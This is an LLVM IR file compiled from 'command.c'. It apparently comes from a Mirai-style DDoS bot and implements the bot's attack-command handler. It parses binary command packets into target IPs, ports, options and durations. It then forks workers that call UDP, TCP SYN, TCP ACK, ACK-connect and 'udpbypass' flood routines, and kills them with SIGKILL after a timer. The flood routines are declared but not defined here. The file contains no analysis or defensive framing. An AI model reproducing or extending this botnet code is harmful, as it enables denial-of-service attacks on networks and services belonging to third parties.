; ModuleID = 'command.c'
source_filename = "command.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-pc-linux-gnu"

%struct.command = type { i8, i8* (...)* }
%struct.option = type { i8, i16, i8* }
%struct.target = type { i32, i16 }
%struct.arguments = type { %struct.target*, %struct.option*, i8, i8, i16 }

@LOCAL_ADDRESS = dso_local global i32 0, align 4
@command_list = dso_local global [6 x %struct.command] zeroinitializer, align 16

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i8* @retrieve_opt_str(%struct.option* %0, i8 zeroext %1, i8 zeroext %2, i8* %3) #0 {
  %5 = alloca %struct.option*, align 8
  %6 = alloca i8, align 1
  %7 = alloca i8, align 1
  %8 = alloca i8*, align 8
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  store %struct.option* %0, %struct.option** %5, align 8
  store i8 %1, i8* %6, align 1
  store i8 %2, i8* %7, align 1
  store i8* %3, i8** %8, align 8
  store i32 0, i32* %10, align 4
  %11 = load i8*, i8** %8, align 8
  store i8* %11, i8** %9, align 8
  store i32 0, i32* %10, align 4
  br label %12

12:                                               ; preds = %36, %4
  %13 = load i32, i32* %10, align 4
  %14 = load i8, i8* %6, align 1
  %15 = zext i8 %14 to i32
  %16 = icmp slt i32 %13, %15
  br i1 %16, label %17, label %39

17:                                               ; preds = %12
  %18 = load %struct.option*, %struct.option** %5, align 8
  %19 = load i32, i32* %10, align 4
  %20 = sext i32 %19 to i64
  %21 = getelementptr inbounds %struct.option, %struct.option* %18, i64 %20
  %22 = getelementptr inbounds %struct.option, %struct.option* %21, i32 0, i32 0
  %23 = load i8, i8* %22, align 8
  %24 = zext i8 %23 to i32
  %25 = load i8, i8* %7, align 1
  %26 = zext i8 %25 to i32
  %27 = icmp eq i32 %24, %26
  br i1 %27, label %28, label %35

28:                                               ; preds = %17
  %29 = load %struct.option*, %struct.option** %5, align 8
  %30 = load i32, i32* %10, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds %struct.option, %struct.option* %29, i64 %31
  %33 = getelementptr inbounds %struct.option, %struct.option* %32, i32 0, i32 2
  %34 = load i8*, i8** %33, align 8
  store i8* %34, i8** %9, align 8
  br label %35

35:                                               ; preds = %28, %17
  br label %36

36:                                               ; preds = %35
  %37 = load i32, i32* %10, align 4
  %38 = add nsw i32 %37, 1
  store i32 %38, i32* %10, align 4
  br label %12, !llvm.loop !6

39:                                               ; preds = %12
  %40 = load i8*, i8** %9, align 8
  ret i8* %40
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local zeroext i16 @retrieve_opt_num(%struct.option* %0, i8 zeroext %1, i8 zeroext %2, i16 zeroext %3) #0 {
  %5 = alloca %struct.option*, align 8
  %6 = alloca i8, align 1
  %7 = alloca i8, align 1
  %8 = alloca i16, align 2
  %9 = alloca i16, align 2
  %10 = alloca i32, align 4
  store %struct.option* %0, %struct.option** %5, align 8
  store i8 %1, i8* %6, align 1
  store i8 %2, i8* %7, align 1
  store i16 %3, i16* %8, align 2
  store i16 0, i16* %9, align 2
  store i32 0, i32* %10, align 4
  %11 = load i16, i16* %8, align 2
  store i16 %11, i16* %9, align 2
  store i32 0, i32* %10, align 4
  br label %12

12:                                               ; preds = %38, %4
  %13 = load i32, i32* %10, align 4
  %14 = load i8, i8* %6, align 1
  %15 = zext i8 %14 to i32
  %16 = icmp slt i32 %13, %15
  br i1 %16, label %17, label %41

17:                                               ; preds = %12
  %18 = load %struct.option*, %struct.option** %5, align 8
  %19 = load i32, i32* %10, align 4
  %20 = sext i32 %19 to i64
  %21 = getelementptr inbounds %struct.option, %struct.option* %18, i64 %20
  %22 = getelementptr inbounds %struct.option, %struct.option* %21, i32 0, i32 0
  %23 = load i8, i8* %22, align 8
  %24 = zext i8 %23 to i32
  %25 = load i8, i8* %7, align 1
  %26 = zext i8 %25 to i32
  %27 = icmp eq i32 %24, %26
  br i1 %27, label %28, label %37

28:                                               ; preds = %17
  %29 = load %struct.option*, %struct.option** %5, align 8
  %30 = load i32, i32* %10, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds %struct.option, %struct.option* %29, i64 %31
  %33 = getelementptr inbounds %struct.option, %struct.option* %32, i32 0, i32 2
  %34 = load i8*, i8** %33, align 8
  %35 = call i32 @atoi(i8* %34) #7
  %36 = trunc i32 %35 to i16
  store i16 %36, i16* %9, align 2
  br label %37

37:                                               ; preds = %28, %17
  br label %38

38:                                               ; preds = %37
  %39 = load i32, i32* %10, align 4
  %40 = add nsw i32 %39, 1
  store i32 %40, i32* %10, align 4
  br label %12, !llvm.loop !8

41:                                               ; preds = %12
  %42 = load i16, i16* %9, align 2
  ret i16 %42
}

; Function Attrs: nounwind readonly willreturn
declare i32 @atoi(i8*) #1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @retrieve_opt_ipv4(%struct.option* %0, i8 zeroext %1, i8 zeroext %2, i32 %3) #0 {
  %5 = alloca %struct.option*, align 8
  %6 = alloca i8, align 1
  %7 = alloca i8, align 1
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  store %struct.option* %0, %struct.option** %5, align 8
  store i8 %1, i8* %6, align 1
  store i8 %2, i8* %7, align 1
  store i32 %3, i32* %8, align 4
  store i32 0, i32* %9, align 4
  store i32 0, i32* %10, align 4
  %11 = load i32, i32* %8, align 4
  store i32 %11, i32* %9, align 4
  store i32 0, i32* %10, align 4
  br label %12

12:                                               ; preds = %37, %4
  %13 = load i32, i32* %10, align 4
  %14 = load i8, i8* %6, align 1
  %15 = zext i8 %14 to i32
  %16 = icmp slt i32 %13, %15
  br i1 %16, label %17, label %40

17:                                               ; preds = %12
  %18 = load %struct.option*, %struct.option** %5, align 8
  %19 = load i32, i32* %10, align 4
  %20 = sext i32 %19 to i64
  %21 = getelementptr inbounds %struct.option, %struct.option* %18, i64 %20
  %22 = getelementptr inbounds %struct.option, %struct.option* %21, i32 0, i32 0
  %23 = load i8, i8* %22, align 8
  %24 = zext i8 %23 to i32
  %25 = load i8, i8* %7, align 1
  %26 = zext i8 %25 to i32
  %27 = icmp eq i32 %24, %26
  br i1 %27, label %28, label %36

28:                                               ; preds = %17
  %29 = load %struct.option*, %struct.option** %5, align 8
  %30 = load i32, i32* %10, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds %struct.option, %struct.option* %29, i64 %31
  %33 = getelementptr inbounds %struct.option, %struct.option* %32, i32 0, i32 2
  %34 = load i8*, i8** %33, align 8
  %35 = call i32 @inet_addr(i8* %34) #8
  store i32 %35, i32* %9, align 4
  br label %36

36:                                               ; preds = %28, %17
  br label %37

37:                                               ; preds = %36
  %38 = load i32, i32* %10, align 4
  %39 = add nsw i32 %38, 1
  store i32 %39, i32* %10, align 4
  br label %12, !llvm.loop !9

40:                                               ; preds = %12
  %41 = load i32, i32* %9, align 4
  ret i32 %41
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) #2

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @command_parse(i8* %0, i32 %1) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i8, align 1
  %6 = alloca i8, align 1
  %7 = alloca %struct.option*, align 8
  %8 = alloca %struct.target*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i8, align 1
  %11 = alloca i16, align 2
  %12 = alloca i16, align 2
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  store i8 0, i8* %5, align 1
  store i8 0, i8* %6, align 1
  store %struct.option* null, %struct.option** %7, align 8
  store %struct.target* null, %struct.target** %8, align 8
  store i32 0, i32* %9, align 4
  store i8 0, i8* %10, align 1
  store i16 0, i16* %11, align 2
  %13 = load i8*, i8** %3, align 8
  %14 = load i8, i8* %13, align 1
  store i8 %14, i8* %5, align 1
  %15 = load i8*, i8** %3, align 8
  %16 = getelementptr inbounds i8, i8* %15, i64 1
  store i8* %16, i8** %3, align 8
  %17 = load i32, i32* %4, align 4
  %18 = sext i32 %17 to i64
  %19 = sub i64 %18, 1
  %20 = trunc i64 %19 to i32
  store i32 %20, i32* %4, align 4
  %21 = load i8*, i8** %3, align 8
  %22 = bitcast i8* %21 to i16*
  %23 = load i16, i16* %22, align 2
  store i16 %23, i16* %11, align 2
  %24 = load i16, i16* %11, align 2
  %25 = call zeroext i16 @ntohs(i16 zeroext %24) #9
  store i16 %25, i16* %11, align 2
  %26 = load i8*, i8** %3, align 8
  %27 = getelementptr inbounds i8, i8* %26, i64 2
  store i8* %27, i8** %3, align 8
  %28 = load i32, i32* %4, align 4
  %29 = sext i32 %28 to i64
  %30 = sub i64 %29, 2
  %31 = trunc i64 %30 to i32
  store i32 %31, i32* %4, align 4
  %32 = load i8*, i8** %3, align 8
  %33 = load i8, i8* %32, align 1
  store i8 %33, i8* %6, align 1
  %34 = load i8*, i8** %3, align 8
  %35 = getelementptr inbounds i8, i8* %34, i64 1
  store i8* %35, i8** %3, align 8
  %36 = load i32, i32* %4, align 4
  %37 = sext i32 %36 to i64
  %38 = sub i64 %37, 1
  %39 = trunc i64 %38 to i32
  store i32 %39, i32* %4, align 4
  %40 = load i8, i8* %6, align 1
  %41 = zext i8 %40 to i64
  %42 = call noalias align 16 i8* @calloc(i64 %41, i64 8) #8
  %43 = bitcast i8* %42 to %struct.target*
  store %struct.target* %43, %struct.target** %8, align 8
  %44 = load %struct.target*, %struct.target** %8, align 8
  %45 = icmp ne %struct.target* %44, null
  br i1 %45, label %47, label %46

46:                                               ; preds = %2
  br label %204

47:                                               ; preds = %2
  store i32 0, i32* %9, align 4
  br label %48

48:                                               ; preds = %94, %47
  %49 = load i32, i32* %9, align 4
  %50 = load i8, i8* %6, align 1
  %51 = zext i8 %50 to i32
  %52 = icmp slt i32 %49, %51
  br i1 %52, label %53, label %97

53:                                               ; preds = %48
  %54 = load i8*, i8** %3, align 8
  %55 = bitcast i8* %54 to i32*
  %56 = load i32, i32* %55, align 4
  %57 = load %struct.target*, %struct.target** %8, align 8
  %58 = load i32, i32* %9, align 4
  %59 = sext i32 %58 to i64
  %60 = getelementptr inbounds %struct.target, %struct.target* %57, i64 %59
  %61 = getelementptr inbounds %struct.target, %struct.target* %60, i32 0, i32 0
  store i32 %56, i32* %61, align 4
  %62 = load i8*, i8** %3, align 8
  %63 = getelementptr inbounds i8, i8* %62, i64 4
  store i8* %63, i8** %3, align 8
  %64 = load i32, i32* %4, align 4
  %65 = sext i32 %64 to i64
  %66 = sub i64 %65, 4
  %67 = trunc i64 %66 to i32
  store i32 %67, i32* %4, align 4
  %68 = load i8*, i8** %3, align 8
  %69 = bitcast i8* %68 to i16*
  %70 = load i16, i16* %69, align 2
  %71 = load %struct.target*, %struct.target** %8, align 8
  %72 = load i32, i32* %9, align 4
  %73 = sext i32 %72 to i64
  %74 = getelementptr inbounds %struct.target, %struct.target* %71, i64 %73
  %75 = getelementptr inbounds %struct.target, %struct.target* %74, i32 0, i32 1
  store i16 %70, i16* %75, align 4
  %76 = load %struct.target*, %struct.target** %8, align 8
  %77 = load i32, i32* %9, align 4
  %78 = sext i32 %77 to i64
  %79 = getelementptr inbounds %struct.target, %struct.target* %76, i64 %78
  %80 = getelementptr inbounds %struct.target, %struct.target* %79, i32 0, i32 1
  %81 = load i16, i16* %80, align 4
  %82 = call zeroext i16 @ntohs(i16 zeroext %81) #9
  %83 = load %struct.target*, %struct.target** %8, align 8
  %84 = load i32, i32* %9, align 4
  %85 = sext i32 %84 to i64
  %86 = getelementptr inbounds %struct.target, %struct.target* %83, i64 %85
  %87 = getelementptr inbounds %struct.target, %struct.target* %86, i32 0, i32 1
  store i16 %82, i16* %87, align 4
  %88 = load i8*, i8** %3, align 8
  %89 = getelementptr inbounds i8, i8* %88, i64 2
  store i8* %89, i8** %3, align 8
  %90 = load i32, i32* %4, align 4
  %91 = sext i32 %90 to i64
  %92 = sub i64 %91, 2
  %93 = trunc i64 %92 to i32
  store i32 %93, i32* %4, align 4
  br label %94

94:                                               ; preds = %53
  %95 = load i32, i32* %9, align 4
  %96 = add nsw i32 %95, 1
  store i32 %96, i32* %9, align 4
  br label %48, !llvm.loop !10

97:                                               ; preds = %48
  %98 = load i8*, i8** %3, align 8
  %99 = load i8, i8* %98, align 1
  store i8 %99, i8* %10, align 1
  %100 = load i8*, i8** %3, align 8
  %101 = getelementptr inbounds i8, i8* %100, i64 1
  store i8* %101, i8** %3, align 8
  %102 = load i32, i32* %4, align 4
  %103 = sext i32 %102 to i64
  %104 = sub i64 %103, 1
  %105 = trunc i64 %104 to i32
  store i32 %105, i32* %4, align 4
  %106 = load i8, i8* %10, align 1
  %107 = zext i8 %106 to i32
  %108 = icmp eq i32 %107, 0
  br i1 %108, label %109, label %116

109:                                              ; preds = %97
  %110 = load i8, i8* %5, align 1
  %111 = load %struct.option*, %struct.option** %7, align 8
  %112 = load i8, i8* %10, align 1
  %113 = load %struct.target*, %struct.target** %8, align 8
  %114 = load i8, i8* %6, align 1
  %115 = load i16, i16* %11, align 2
  call void @command_flood(i8 zeroext %110, %struct.option* %111, i8 zeroext %112, %struct.target* %113, i8 zeroext %114, i16 zeroext %115)
  br label %204

116:                                              ; preds = %97
  %117 = load i8, i8* %10, align 1
  %118 = zext i8 %117 to i64
  %119 = call noalias align 16 i8* @calloc(i64 %118, i64 16) #8
  %120 = bitcast i8* %119 to %struct.option*
  store %struct.option* %120, %struct.option** %7, align 8
  %121 = load %struct.option*, %struct.option** %7, align 8
  %122 = icmp ne %struct.option* %121, null
  br i1 %122, label %126, label %123

123:                                              ; preds = %116
  %124 = load %struct.target*, %struct.target** %8, align 8
  %125 = bitcast %struct.target* %124 to i8*
  call void @free(i8* %125) #8
  br label %204

126:                                              ; preds = %116
  store i32 0, i32* %9, align 4
  br label %127

127:                                              ; preds = %194, %126
  %128 = load i32, i32* %9, align 4
  %129 = load i8, i8* %10, align 1
  %130 = zext i8 %129 to i32
  %131 = icmp slt i32 %128, %130
  br i1 %131, label %132, label %197

132:                                              ; preds = %127
  store i16 0, i16* %12, align 2
  %133 = load i8*, i8** %3, align 8
  %134 = load i8, i8* %133, align 1
  %135 = load %struct.option*, %struct.option** %7, align 8
  %136 = load i32, i32* %9, align 4
  %137 = sext i32 %136 to i64
  %138 = getelementptr inbounds %struct.option, %struct.option* %135, i64 %137
  %139 = getelementptr inbounds %struct.option, %struct.option* %138, i32 0, i32 0
  store i8 %134, i8* %139, align 8
  %140 = load i8*, i8** %3, align 8
  %141 = getelementptr inbounds i8, i8* %140, i64 1
  store i8* %141, i8** %3, align 8
  %142 = load i32, i32* %4, align 4
  %143 = sext i32 %142 to i64
  %144 = sub i64 %143, 1
  %145 = trunc i64 %144 to i32
  store i32 %145, i32* %4, align 4
  %146 = load i8*, i8** %3, align 8
  %147 = bitcast i8* %146 to i16*
  %148 = load i16, i16* %147, align 2
  store i16 %148, i16* %12, align 2
  %149 = load i16, i16* %12, align 2
  %150 = call zeroext i16 @ntohs(i16 zeroext %149) #9
  store i16 %150, i16* %12, align 2
  %151 = load i8*, i8** %3, align 8
  %152 = getelementptr inbounds i8, i8* %151, i64 2
  store i8* %152, i8** %3, align 8
  %153 = load i32, i32* %4, align 4
  %154 = sext i32 %153 to i64
  %155 = sub i64 %154, 2
  %156 = trunc i64 %155 to i32
  store i32 %156, i32* %4, align 4
  %157 = load i16, i16* %12, align 2
  %158 = zext i16 %157 to i32
  %159 = add nsw i32 %158, 1
  %160 = sext i32 %159 to i64
  %161 = call noalias align 16 i8* @malloc(i64 %160) #8
  %162 = load %struct.option*, %struct.option** %7, align 8
  %163 = load i32, i32* %9, align 4
  %164 = sext i32 %163 to i64
  %165 = getelementptr inbounds %struct.option, %struct.option* %162, i64 %164
  %166 = getelementptr inbounds %struct.option, %struct.option* %165, i32 0, i32 2
  store i8* %161, i8** %166, align 8
  %167 = load %struct.option*, %struct.option** %7, align 8
  %168 = load i32, i32* %9, align 4
  %169 = sext i32 %168 to i64
  %170 = getelementptr inbounds %struct.option, %struct.option* %167, i64 %169
  %171 = getelementptr inbounds %struct.option, %struct.option* %170, i32 0, i32 2
  %172 = load i8*, i8** %171, align 8
  %173 = load i8*, i8** %3, align 8
  %174 = load i16, i16* %12, align 2
  %175 = zext i16 %174 to i64
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 1 %172, i8* align 1 %173, i64 %175, i1 false)
  %176 = load %struct.option*, %struct.option** %7, align 8
  %177 = load i32, i32* %9, align 4
  %178 = sext i32 %177 to i64
  %179 = getelementptr inbounds %struct.option, %struct.option* %176, i64 %178
  %180 = getelementptr inbounds %struct.option, %struct.option* %179, i32 0, i32 2
  %181 = load i8*, i8** %180, align 8
  %182 = load i16, i16* %12, align 2
  %183 = zext i16 %182 to i64
  %184 = getelementptr inbounds i8, i8* %181, i64 %183
  store i8 0, i8* %184, align 1
  %185 = load i16, i16* %12, align 2
  %186 = zext i16 %185 to i32
  %187 = load i8*, i8** %3, align 8
  %188 = sext i32 %186 to i64
  %189 = getelementptr inbounds i8, i8* %187, i64 %188
  store i8* %189, i8** %3, align 8
  %190 = load i16, i16* %12, align 2
  %191 = zext i16 %190 to i32
  %192 = load i32, i32* %4, align 4
  %193 = sub nsw i32 %192, %191
  store i32 %193, i32* %4, align 4
  br label %194

194:                                              ; preds = %132
  %195 = load i32, i32* %9, align 4
  %196 = add nsw i32 %195, 1
  store i32 %196, i32* %9, align 4
  br label %127, !llvm.loop !11

197:                                              ; preds = %127
  %198 = load i8, i8* %5, align 1
  %199 = load %struct.option*, %struct.option** %7, align 8
  %200 = load i8, i8* %10, align 1
  %201 = load %struct.target*, %struct.target** %8, align 8
  %202 = load i8, i8* %6, align 1
  %203 = load i16, i16* %11, align 2
  call void @command_flood(i8 zeroext %198, %struct.option* %199, i8 zeroext %200, %struct.target* %201, i8 zeroext %202, i16 zeroext %203)
  br label %204

204:                                              ; preds = %197, %123, %109, %46
  ret void
}

; Function Attrs: nounwind readnone willreturn
declare zeroext i16 @ntohs(i16 zeroext) #3

; Function Attrs: nounwind
declare noalias align 16 i8* @calloc(i64, i64) #2

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define internal void @command_flood(i8 zeroext %0, %struct.option* %1, i8 zeroext %2, %struct.target* %3, i8 zeroext %4, i16 zeroext %5) #0 {
  %7 = alloca i8, align 1
  %8 = alloca %struct.option*, align 8
  %9 = alloca i8, align 1
  %10 = alloca %struct.target*, align 8
  %11 = alloca i8, align 1
  %12 = alloca i16, align 2
  %13 = alloca i8* (...)*, align 8
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca %struct.arguments, align 8
  store i8 %0, i8* %7, align 1
  store %struct.option* %1, %struct.option** %8, align 8
  store i8 %2, i8* %9, align 1
  store %struct.target* %3, %struct.target** %10, align 8
  store i8 %4, i8* %11, align 1
  store i16 %5, i16* %12, align 2
  store i32 -1, i32* %14, align 4
  store i32 -1, i32* %15, align 4
  %17 = load i8, i8* %7, align 1
  %18 = call i8* (...)* @retrieve_command_func(i8 zeroext %17)
  store i8* (...)* %18, i8* (...)** %13, align 8
  %19 = load i8* (...)*, i8* (...)** %13, align 8
  %20 = icmp ne i8* (...)* %19, null
  br i1 %20, label %22, label %21

21:                                               ; preds = %6
  br label %54

22:                                               ; preds = %6
  %23 = load %struct.target*, %struct.target** %10, align 8
  %24 = getelementptr inbounds %struct.arguments, %struct.arguments* %16, i32 0, i32 0
  store %struct.target* %23, %struct.target** %24, align 8
  %25 = load i8, i8* %9, align 1
  %26 = getelementptr inbounds %struct.arguments, %struct.arguments* %16, i32 0, i32 2
  store i8 %25, i8* %26, align 8
  %27 = load i8, i8* %11, align 1
  %28 = getelementptr inbounds %struct.arguments, %struct.arguments* %16, i32 0, i32 3
  store i8 %27, i8* %28, align 1
  %29 = load %struct.option*, %struct.option** %8, align 8
  %30 = getelementptr inbounds %struct.arguments, %struct.arguments* %16, i32 0, i32 1
  store %struct.option* %29, %struct.option** %30, align 8
  %31 = load i16, i16* %12, align 2
  %32 = getelementptr inbounds %struct.arguments, %struct.arguments* %16, i32 0, i32 4
  store i16 %31, i16* %32, align 2
  %33 = call i32 @fork() #8
  store i32 %33, i32* %14, align 4
  %34 = load i32, i32* %14, align 4
  %35 = icmp eq i32 %34, -1
  br i1 %35, label %36, label %37

36:                                               ; preds = %22
  br label %54

37:                                               ; preds = %22
  %38 = load i32, i32* %14, align 4
  %39 = icmp ne i32 %38, 0
  br i1 %39, label %40, label %41

40:                                               ; preds = %37
  br label %54

41:                                               ; preds = %37
  %42 = call i32 @fork() #8
  store i32 %42, i32* %15, align 4
  %43 = load i32, i32* %15, align 4
  %44 = icmp eq i32 %43, -1
  br i1 %44, label %45, label %46

45:                                               ; preds = %41
  call void @exit(i32 1) #10
  unreachable

46:                                               ; preds = %41
  %47 = load i32, i32* %15, align 4
  %48 = icmp eq i32 %47, 0
  br i1 %48, label %49, label %50

49:                                               ; preds = %46
  call void @terminate_command(%struct.arguments* %16)
  br label %50

50:                                               ; preds = %49, %46
  %51 = load i8* (...)*, i8* (...)** %13, align 8
  %52 = bitcast i8* (...)* %51 to i8* (%struct.arguments*, ...)*
  %53 = call i8* (%struct.arguments*, ...) %52(%struct.arguments* %16)
  br label %54

54:                                               ; preds = %50, %40, %36, %21
  ret void
}

; Function Attrs: nounwind
declare void @free(i8*) #2

; Function Attrs: nounwind
declare noalias align 16 i8* @malloc(i64) #2

; Function Attrs: argmemonly nofree nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #4

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @init_commands() #0 {
  call void @load_command(i8 zeroext 1, i8* (...)* bitcast (void (%struct.arguments*)* @flood_udp to i8* (...)*))
  call void @load_command(i8 zeroext 3, i8* (...)* bitcast (void (%struct.arguments*)* @flood_tcp_syn to i8* (...)*))
  call void @load_command(i8 zeroext 2, i8* (...)* bitcast (void (%struct.arguments*)* @flood_tcp_ack to i8* (...)*))
  call void @load_command(i8 zeroext 7, i8* (...)* bitcast (void (%struct.arguments*)* @flood_tcp_ack_connect to i8* (...)*))
  call void @load_command(i8 zeroext 20, i8* (...)* bitcast (void (%struct.arguments*)* @flood_udpbypass to i8* (...)*))
  ret void
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define internal void @load_command(i8 zeroext %0, i8* (...)* %1) #0 {
  %3 = alloca i8, align 1
  %4 = alloca i8* (...)*, align 8
  store i8 %0, i8* %3, align 1
  store i8* (...)* %1, i8* (...)** %4, align 8
  %5 = load i8, i8* %3, align 1
  %6 = load i8, i8* %3, align 1
  %7 = zext i8 %6 to i64
  %8 = getelementptr inbounds [6 x %struct.command], [6 x %struct.command]* @command_list, i64 0, i64 %7
  %9 = getelementptr inbounds %struct.command, %struct.command* %8, i32 0, i32 0
  store i8 %5, i8* %9, align 16
  %10 = load i8* (...)*, i8* (...)** %4, align 8
  %11 = load i8, i8* %3, align 1
  %12 = zext i8 %11 to i64
  %13 = getelementptr inbounds [6 x %struct.command], [6 x %struct.command]* @command_list, i64 0, i64 %12
  %14 = getelementptr inbounds %struct.command, %struct.command* %13, i32 0, i32 1
  store i8* (...)* %10, i8* (...)** %14, align 8
  ret void
}

declare void @flood_udp(%struct.arguments*) #5

declare void @flood_tcp_syn(%struct.arguments*) #5

declare void @flood_tcp_ack(%struct.arguments*) #5

declare void @flood_tcp_ack_connect(%struct.arguments*) #5

declare void @flood_udpbypass(%struct.arguments*) #5

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define internal i8* (...)* @retrieve_command_func(i8 zeroext %0) #0 {
  %2 = alloca i8, align 1
  store i8 %0, i8* %2, align 1
  %3 = load i8, i8* %2, align 1
  %4 = zext i8 %3 to i64
  %5 = getelementptr inbounds [6 x %struct.command], [6 x %struct.command]* @command_list, i64 0, i64 %4
  %6 = getelementptr inbounds %struct.command, %struct.command* %5, i32 0, i32 1
  %7 = load i8* (...)*, i8* (...)** %6, align 8
  ret i8* (...)* %7
}

; Function Attrs: nounwind
declare i32 @fork() #2

; Function Attrs: noreturn nounwind
declare void @exit(i32) #6

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define internal void @terminate_command(%struct.arguments* %0) #0 {
  %2 = alloca %struct.arguments*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  store %struct.arguments* %0, %struct.arguments** %2, align 8
  store i32 -1, i32* %3, align 4
  store i32 0, i32* %4, align 4
  %5 = load %struct.arguments*, %struct.arguments** %2, align 8
  %6 = getelementptr inbounds %struct.arguments, %struct.arguments* %5, i32 0, i32 4
  %7 = load i16, i16* %6, align 2
  %8 = zext i16 %7 to i32
  %9 = call i32 @sleep(i32 %8)
  %10 = call i32 @getppid() #8
  store i32 %10, i32* %3, align 4
  %11 = load i32, i32* %3, align 4
  %12 = icmp sgt i32 %11, 1
  br i1 %12, label %13, label %16

13:                                               ; preds = %1
  %14 = load i32, i32* %3, align 4
  %15 = call i32 @kill(i32 %14, i32 9) #8
  br label %16

16:                                               ; preds = %13, %1
  %17 = load %struct.arguments*, %struct.arguments** %2, align 8
  %18 = getelementptr inbounds %struct.arguments, %struct.arguments* %17, i32 0, i32 0
  %19 = load %struct.target*, %struct.target** %18, align 8
  %20 = icmp ne %struct.target* %19, null
  br i1 %20, label %21, label %26

21:                                               ; preds = %16
  %22 = load %struct.arguments*, %struct.arguments** %2, align 8
  %23 = getelementptr inbounds %struct.arguments, %struct.arguments* %22, i32 0, i32 0
  %24 = load %struct.target*, %struct.target** %23, align 8
  %25 = bitcast %struct.target* %24 to i8*
  call void @free(i8* %25) #8
  br label %26

26:                                               ; preds = %21, %16
  %27 = load %struct.arguments*, %struct.arguments** %2, align 8
  %28 = getelementptr inbounds %struct.arguments, %struct.arguments* %27, i32 0, i32 1
  %29 = load %struct.option*, %struct.option** %28, align 8
  %30 = icmp ne %struct.option* %29, null
  br i1 %30, label %32, label %31

31:                                               ; preds = %26
  call void @exit(i32 0) #10
  unreachable

32:                                               ; preds = %26
  store i32 0, i32* %4, align 4
  br label %33

33:                                               ; preds = %49, %32
  %34 = load i32, i32* %4, align 4
  %35 = load %struct.arguments*, %struct.arguments** %2, align 8
  %36 = getelementptr inbounds %struct.arguments, %struct.arguments* %35, i32 0, i32 2
  %37 = load i8, i8* %36, align 8
  %38 = zext i8 %37 to i32
  %39 = icmp slt i32 %34, %38
  br i1 %39, label %40, label %52

40:                                               ; preds = %33
  %41 = load %struct.arguments*, %struct.arguments** %2, align 8
  %42 = getelementptr inbounds %struct.arguments, %struct.arguments* %41, i32 0, i32 1
  %43 = load %struct.option*, %struct.option** %42, align 8
  %44 = load i32, i32* %4, align 4
  %45 = sext i32 %44 to i64
  %46 = getelementptr inbounds %struct.option, %struct.option* %43, i64 %45
  %47 = getelementptr inbounds %struct.option, %struct.option* %46, i32 0, i32 2
  %48 = load i8*, i8** %47, align 8
  call void @free(i8* %48) #8
  br label %49

49:                                               ; preds = %40
  %50 = load i32, i32* %4, align 4
  %51 = add nsw i32 %50, 1
  store i32 %51, i32* %4, align 4
  br label %33, !llvm.loop !12

52:                                               ; preds = %33
  %53 = load %struct.arguments*, %struct.arguments** %2, align 8
  %54 = getelementptr inbounds %struct.arguments, %struct.arguments* %53, i32 0, i32 1
  %55 = load %struct.option*, %struct.option** %54, align 8
  %56 = bitcast %struct.option* %55 to i8*
  call void @free(i8* %56) #8
  call void @exit(i32 0) #10
  unreachable
}

declare i32 @sleep(i32) #5

; Function Attrs: nounwind
declare i32 @getppid() #2

; Function Attrs: nounwind
declare i32 @kill(i32, i32) #2

attributes #0 = { noinline nounwind optnone sspstrong uwtable "frame-pointer"="all" "min-legal-vector-width"="0" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #1 = { nounwind readonly willreturn "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #2 = { nounwind "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #3 = { nounwind readnone willreturn "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #4 = { argmemonly nofree nounwind willreturn }
attributes #5 = { "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #6 = { noreturn nounwind "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #7 = { nounwind readonly willreturn }
attributes #8 = { nounwind }
attributes #9 = { nounwind readnone willreturn }
attributes #10 = { noreturn nounwind }

!llvm.module.flags = !{!0, !1, !2, !3, !4}
!llvm.ident = !{!5}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{i32 7, !"PIC Level", i32 2}
!2 = !{i32 7, !"PIE Level", i32 2}
!3 = !{i32 7, !"uwtable", i32 1}
!4 = !{i32 7, !"frame-pointer", i32 2}
